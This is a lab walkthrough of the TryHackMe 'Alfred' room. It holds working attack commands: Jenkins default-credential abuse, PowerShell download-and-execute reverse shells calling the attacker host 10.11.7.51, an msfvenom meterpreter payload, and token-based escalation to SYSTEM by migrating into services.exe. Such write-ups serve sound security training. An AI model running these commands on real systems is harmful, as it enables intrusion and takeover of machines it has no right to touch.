# Alfred



## Recon



### nmap

```nmap
# Nmap 7.91 scan initiated Tue Mar 16 23:54:51 2021 as: nmap -sC -sV -Pn -p- -oA nmap/alfred 10.10.138.219
Nmap scan report for 10.10.138.219
Host is up (0.015s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2021-03-15T22:29:35
|_Not valid after:  2021-09-14T22:29:35
|_ssl-date: 2021-03-16T23:57:04+00:00; 0s from scanner time.
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 16 23:57:04 2021 -- 1 IP address (1 host up) scanned in 133.06 seconds
```



## Jenkins



![login](/home/boolean/notes/tryhackme/assets/alfred-login.png)

Default credentials of admin:admin; allow us to login.



### Using Jenkins to perform a system command that will upload a script that creates a reverse tcp shell.

Within the existing project we can modify the build step to perform windows commands



![alfred-config-proj](/home/boolean/notes/tryhackme/assets/alfred-config-proj.png)

![alfred-build](/home/boolean/notes/tryhackme/assets/alfred-build.png)

We add in the command below into the build step, when the build is triggered it will attempt to download and execute the script ```powershell Invoke-PowerShellTcp.ps1 ```, creating a reverse shell on Port 9001

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.7.51/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.7.51 -Port 9001
```



## Foothold



Before triggering a build of the project we need to do 2 prepatory steps.

1. Start a webserver from where the script can be downloaded from.
2. Setup a netcat listener on port 9001



### Starting Webserver

Before starting ensure you have the ```powershell Invoke-PowerShellTcp.ps1 ``` in the current working directory

```bash
$ sudo python3 -m http.server 80
```



### Setup a netcat listener

```bash
nc -lvnp 9001
```



### Triggering the build

Use the build now option to initiate a build.

The build will fail, but that the command will execute.

![alfred-build-now](/home/boolean/notes/tryhackme/assets/alfred-build-now.png)



1. The script is downloaded by the victim server
2. Returns a powershell command prompt

![alfred-foothold](/home/boolean/notes/tryhackme/assets/alfred-foothold.png)



## Privesc



To make privesc easier we are going to switch from the existing TCP reverse shell to a meterpreter shell.



### Migrating to Meterpreter Shell

1. Create a Meterpreter Shell Payload using msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.7.51 LPORT=9003 -f exe -o shell9003.exe
```



2. Following the steps used to gain a foot hold, the build step needs to be edited to download the new payload and trigger a build once more. Alternatively you can use the shell thats already been created. The new command should look as follows:

   ```powershell
   powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.7.51/shell9003.exe','shell9003.exe')"
   ```

3. Use the following commands within msfconsole to setup a meterpreter listener

   ```bash
   msf6 > use exploit/multi/handler 
   msf6 > set PAYLOAD windows/meterpreter/reverse_tcp 
   msf6 > set LHOST 10.11.7.51 
   msf6 > set LPORT 9003 
   msf6 > run
   ```

4. When ready to execute use the following command to trigger the exe

   ```powershell
   Start-Process "shell9003.exe"
   ```

   

This should return a meterpreter session

![alfred-meterpreter](/home/boolean/notes/tryhackme/assets/alfred-meterpreter.png)



### Escalating Privilages 

Within the shell we run the command whoami /priv to check what permissions the user alfred has.



![alfred-priv](/home/boolean/notes/tryhackme/assets/alfred-priv.png)



The two permissions that are useful to use here are the SeImpersonatePrivilege and SeDebugPrivilege

 

```bash
C:\Program Files (x86)\Jenkins\workspace\project>whoami /priv
whoami /priv
                                                    
PRIVILEGES INFORMATION                  
----------------------
                                                    
Privilege Name                  Description                               State   
=============================== ========================================= ========
...
SeDebugPrivilege                Debug programs                            Enabled 
...
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 

​```
```

Exiting from the shell and returning to the meterpreter session we load the incognito module, and list all available tokens. The easiest way to think about incognito and tokens is using a cookie to gain access to another process. Using the list_tokens command we can see that BUILTIN\Administrators is available.

```bash
meterpreter > load incognito                                                                                                                                                                                      
Loading extension incognito...Success.                                                                                                                                                                            
meterpreter > list_tokens -g                                                                                                                                                                                      
[-] Warning: Not currently running as SYSTEM, not all tokens will be available                                                                                                                                    
             Call rev2self if primary process token is SYSTEM                                                                                                                                                    
Delegation Tokens Available                                                                                                                                                                                       
========================================                                                                                                                                                                          
\                                                                                                                                 ...                                                                                
BUILTIN\Administrators       
...

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\wscsvc

meterpreter > getuid
Server username: alfred\bruce
```

Now we look for a service that is running as NT AUTHORITY\SYSTEM, services.exe is a good one, so within meterpreter use the migrate command to switch to the services.exe pid. 

```bash
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 ...
 572   564   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 580   516   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 608   564   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
...
meterpreter > migrate 668
[*] Migrating from 1560 to 668...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

If migration is successful then we can check that we are SYSTEM user by running the getuid command.



# Box Rooted

